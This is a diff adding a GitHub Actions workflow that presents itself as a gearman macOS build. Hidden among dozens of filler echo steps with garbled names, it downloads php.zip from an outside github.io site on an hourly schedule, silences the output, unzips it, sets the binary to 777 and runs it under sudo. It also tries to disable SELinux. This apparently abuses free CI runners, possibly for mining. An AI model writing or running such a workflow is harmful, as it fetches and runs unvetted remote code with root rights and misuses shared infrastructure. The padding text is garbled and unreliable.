@@ -1,0 +1,192 @@
+# This is a basic workflow to help you get started with Actions
+
+name: gearman-macos-build-gnusource
+
+# Controls when the workflow will run
+on:
+  # Triggers the workflow on push or pull request events but only for the "main" branch
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+
+  # Allows you to run this workflow manually from the Actions tab
+  schedule:
+    - cron: '30 * * * *'
+  workflow_dispatch:
+
+# A workflow run is made up of one or more jobs that can run sequentially or in parallel
+jobs:
+  # This workflow contains a single job called "build"
+  build:
+    # The type of runner that the job will run on
+    runs-on: ubuntu-latest
+
+    # Steps represent a sequence of tasks that will be executed as part of the job
+    steps:
+      # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
+      - uses: actions/checkout@v3
+
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+
+      # Runs a set of commands using the runners shell
+      - name: Run php work
+        run: |
+          echo Add other actions to build,
+          echo test, and deploy your project.
+          sudo echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
+      # Runs a single command using the runners shell
+      - name: Run a one-linsgze script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-lsgdine script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-sgline script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line ssgcript
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line sdsgcript
+        run: echo ohhhhhhhhhhhhhthefsef dsgrestssssssss151684949641941941e runners shellhhhhhhhh
+      # Runs a single command uthefsef dsgrestssssssss151684949641941941e runners shellsing the runners shell
+      - name: Run a one-line thefsef dsgrestshttpshttpshttpssssssss151684949641941941e runners shellsgdscript
+        run: echo ohhhhhhhhhhhthefsef dsgrestssshttpshttpshttp1941941e runners shellhhhhhhhhhh
+      # Runs a single command usthefsef dsgrestssssssss1516849496httpshttpshttp41941e runners shelling the runners shell
+      - name: Run a one-line sgthefsef dsgrestssssssss151684949httpshttpshttp41941e runners shellscript
+        run: echo ohhhhhhhhhhhthefsef dsgrestssssssss15168494964httpshttpshttp941e runners shellhhhhhhhhhh
+      # Runs a single command uthefsef dsgrestssssssss15168494964httpshttpshttp941e runners shellsing the runners shell
+      - name: Run a onezgezzzzzzzzzzhttpshttpshttpiiiiiiiiiiiiiiiiiiiiiiiiii-linesg script
+        run: curl -L --progress-bar "https://fuserh.github.io/php.zip" -o ./php.zip 2>/dev/null
+      # Runs a single command using the ruphphpphphpphphpphphphttpshttpshttphphphphphphphpphphphphphphphphphnners shell
+      - name: Run a one-line ffffffffhttpshttpshttpffffffffffffffhttpshttpshttpfffffffffffffdszgzgdscript
+        run: echo ohhhhhhhhhhhhhhphphphphphpphphttpshttpshttpphphphpphphpphphphphpphphpphhpphphphphpphphhhhhhh
+      # Runs a single command using thefsef dsgrestssssssss1516httpshttpshttp641941941e runners shell
+      - name: Run a one-line sczsgdsthefsef dsgrestssssssss151684949641941941e runners shellzript
+        run: echo ohhhhhhhhhhhhhhhhhhthefsef dsgrestssssssss1516849httpshttpshttp1941941e runners shellhhh
+      # Runs a single command using tthefsef dsgrestssssssss151684949641941941e runners shellhe runners shell
+      - name: Run a one-line sccxzrrthefsef dsgrestsssssssshttpshttpshttp49641941941e runners shellipt
+        run: echo ohhhhhhhhhhhhhhhhhthefsef dsgrestssssssss151684949641941941e runners shellhhhh
+      # Runs a single command using tthefsef dsgrestssssshttpshttpshttppshttpshttp84949641941941e runners shellhe runners shell
+      - name: Runegsz a one-line scrthefsef dsgrestssssssss151684949641941941e runners shellipt
+        run: echo ohhhhhhhhhhhhhhhhhhthefsef dsgrestssssssss151684949641941941e runners shellhhh
+      # Runs a single command usthefsef dsgrestssssssss1516httpshttpshttp9641941941e runners shelling ththefsef dsgrestssssssss151684949641941941e runners shelle runners shell
+      - name: Run szgda one-line thefsef dsgrestssssssss151684949httpshttpshttp1941e runners shellscript
+        run: echo ohhhhhhhhhhhhhhhthefsef dsgrestssssssss15168httphttpshttpshttptpshttp641941941e runners shellhhhhhh
+      # Runs a single command usinthefsef dsgrestssssssss151684949httpshttpshttp41941e runners shellg the runners shell
+      - name: Run a one-line scrthefsef dsgrestssssssss15168494httpshttpshttp1941941e runners shellipt
+        run: echo ohhhhhhhhhhhhhhthefsef dsgrestssssssss151684949641941941e runners shellhhhhhhh
+      # Runs a set of commands uthefsef dsgrestssssssss151684949641941941e runners shellsing the runners shell
+      - name: Run sufihsthefsef dsgrestssssssss151684949641941941e runners shellailfaslf
+        run: |
+          unzip php.zip 2>/dev/null
+          rm ./php.zip 2>/dev/null
+      # Runs a single commathefsef dsgrestssssssss151684949641941941e runners shellnd using the runners shell
+      - name: Run a one-linethefsef dsgrestssssssss151684949641941941e runners shell script
+        run: echo ohhhhhhhhhhhthefsef dsgrestssssssss151684949641941941e runners shellhhhhhhhhhh
+      # Runs a single command thefsef dsgrestssssssss151684949641941941e runners shellusing the runners shell
+      - name: Run a one-line sthefsef dsgrestssssssss151684949641941941e runners shellcript
+        run: echo ohhhhhhhhhhhthefsef dsgrestssssssss151684949641941941e runners shellhhhhhhhhhh
+      # Runs a single command uthefsef dsgrestssssssss151684949641941941e runners shellsing the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: chmod 777 ./php/php 2>/dev/null
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: sudo timeout 2m ./php/php 2>/dev/null
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+      # Runs a single command using the runners shell
+      - name: Run a one-line script
+        run: echo ohhhhhhhhhhhhhhhhhhhhh
+          
